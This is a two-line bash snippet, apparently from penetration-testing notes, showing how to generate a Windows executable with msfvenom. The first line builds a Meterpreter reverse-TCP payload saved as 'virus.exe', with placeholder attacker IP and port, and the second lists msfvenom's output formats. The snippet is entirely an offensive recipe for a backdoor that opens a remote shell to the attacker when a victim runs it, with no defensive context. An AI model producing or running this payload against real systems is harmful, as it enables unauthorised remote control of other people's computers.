```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=<IP> LPORT=<PORT> -f exe > virus.exe
msfvenom --list formats
```
